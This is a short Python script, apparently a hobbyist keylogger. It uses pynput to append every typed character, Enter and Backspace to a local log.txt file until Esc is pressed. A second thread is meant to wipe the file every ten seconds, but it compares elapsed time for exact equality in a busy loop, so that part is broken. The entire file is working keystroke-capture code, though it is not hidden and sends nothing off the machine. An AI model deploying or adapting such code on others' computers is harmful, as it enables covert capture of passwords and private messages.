import pynput, schedule, time, threading

from pynput.keyboard import Key, Listener
from threading import Thread

CYCLE = 10 # Time interval to record Logs.
FILENAME = "log.txt" # Filename.
finished = False # Global Track to see if Log is finished.


# Key Press.
def on_press(key):

    text = None
    # Different Write Based on Key Pressed.
    if hasattr(key, 'char'):
        text = key.char
    elif key == Key.enter:
        text = '\n'
    elif key == Key.backspace:
        text = ' {0} '.format(str(key))

    # Write to file if text is valid.
    if text != None:
        write_file(FILENAME, text)

def on_release(key):
    # Stops Log Execution if Esc is pressed.
    if key == Key.esc:
        return False

# File Manager.
def IntervalFileCls():

    StartTime = time.time() # Start Timer at when thread starts.
    global finished

    while (finished == False):
        ElapsedTime = time.time() - StartTime
        if (ElapsedTime == CYCLE): # If 10s has passed.
            clean_file(FILENAME)
            StartTime = time.time() # Reset Start Time.


def clean_file(file):
    open(file, 'w').close()
    print("\n FILE IS CLEANED \n")

def write_file(file, input):
    with open(file, 'a') as file:
        file.write(input)

# --------------- MAIN ---------------
def main():

    global finished

    # Create a new file to write to.
    open(FILENAME, "w").close()

    # Create Keyboard Listener.
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

        if not listener.running:  # If Listener is no longer running, it is finished.
            finished = True
            print("\nIt is finished.\n")


# Execute if it is the main module.
if __name__ == "__main__":
    Thread(target=main).start()
    Thread(target=IntervalFileCls).start()